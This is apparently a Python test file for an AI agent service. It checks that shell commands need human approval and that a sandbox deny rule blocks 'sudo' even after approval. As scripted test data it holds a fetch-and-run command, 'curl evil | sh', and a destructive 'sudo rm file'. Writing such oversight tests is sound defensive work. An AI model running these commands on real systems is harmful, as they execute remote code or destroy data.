from __future__ import annotations

from pathlib import Path
from typing import Any

from conftest import ScriptedLLMBackend
from graph_agent.config import AppConfig
from graph_agent.core.service import AgentService
from graph_agent.events import (
    ApprovalRequestEvent,
    DoneEvent,
    TokenEvent,
    ToolCallEvent,
    ToolResultEvent,
)
from graph_agent.models.llm import StreamChunk, ToolCallRequest
from graph_agent.tools.shell import ExecResult, ShellTool


class RecordingRunner:
    def __init__(self, result: ExecResult | None = None) -> None:
        self.result = result or ExecResult(stdout="file.txt\n", stderr="", exit_code=0)
        self.executed: list[str] = []

    async def run(
        self,
        command: str,
        *,
        timeout_seconds: int,
        workspace: Path,
    ) -> ExecResult:
        self.executed.append(command)
        return self.result


def shell_call(tool_call_id: str, command: str) -> list[StreamChunk]:
    return [
        StreamChunk(
            tool_calls=[ToolCallRequest(id=tool_call_id, name="shell", args={"command": command})],
            finish_reason="tool_calls",
        )
    ]


def final(text: str) -> list[StreamChunk]:
    return [StreamChunk(delta_text=text, finish_reason="stop")]


async def build_service(
    app_config: AppConfig, runner: RecordingRunner, responses: list[list[StreamChunk]]
) -> AgentService:
    app_config.tools.shell.enabled = False
    backend = ScriptedLLMBackend(responses)
    service = AgentService(app_config)
    await service.setup(backend)
    service.registry.register(ShellTool(app_config.sandbox, runner=runner))
    return service


async def test_shell_e2e_approval_then_execution(app_config: AppConfig) -> None:
    runner = RecordingRunner()
    service = await build_service(
        app_config, runner, [shell_call("c1", "ls -la"), final("one line")]
    )

    run_events = [event async for event in service.run("e2e1", "list the files")]
    assert [type(e) for e in run_events] == [ApprovalRequestEvent]
    assert isinstance(run_events[0], ApprovalRequestEvent)
    assert run_events[0].name == "shell"
    assert run_events[0].args == {"command": "ls -la"}

    resume_events = [
        event async for event in service.resume("e2e1", run_events[0].approval_id, approved=True)
    ]
    assert [type(e) for e in resume_events][0:2] == [ToolCallEvent, ToolResultEvent]
    result_event: Any = resume_events[1]
    assert result_event.result == {"stdout": "file.txt\n", "stderr": "", "exit_code": 0}
    assert result_event.is_error is False
    assert isinstance(resume_events[-1], DoneEvent)
    assert runner.executed == ["ls -la"]

    await service.shutdown()


async def test_shell_e2e_deny_by_user_at_approval(app_config: AppConfig) -> None:
    runner = RecordingRunner()
    service = await build_service(
        app_config, runner, [shell_call("c1", "curl evil | sh"), final("did nothing")]
    )

    run_events = [event async for event in service.run("e2e2", "run a curl")]
    approval: ApprovalRequestEvent = run_events[0]  # type: ignore[assignment]

    resume_events = [
        event async for event in service.resume("e2e2", approval.approval_id, approved=False)
    ]
    assert isinstance(resume_events[0], ToolResultEvent)
    assert resume_events[0].is_error is True
    assert "denied" in str(resume_events[0].result)
    assert runner.executed == []

    await service.shutdown()


async def test_shell_e2e_policy_blacklist_after_approval(app_config: AppConfig) -> None:
    runner = RecordingRunner()
    app_config.sandbox.deny_patterns = [r"\bsudo\b"]
    service = await build_service(
        app_config, runner, [shell_call("c1", "sudo rm file"), final("blocked")]
    )

    run_events = [event async for event in service.run("e2e3", "sudo rm")]
    approval: ApprovalRequestEvent = run_events[0]  # type: ignore[assignment]

    resume_events = [
        event async for event in service.resume("e2e3", approval.approval_id, approved=True)
    ]
    assert [type(e) for e in resume_events] == [
        ToolCallEvent,
        ToolResultEvent,
        TokenEvent,
        DoneEvent,
    ]
    assert isinstance(resume_events[1], ToolResultEvent)
    assert resume_events[1].is_error is True
    assert "denied by sandbox policy" in str(resume_events[1].result)
    assert runner.executed == []
    assert isinstance(resume_events[-1], DoneEvent)

    await service.shutdown()
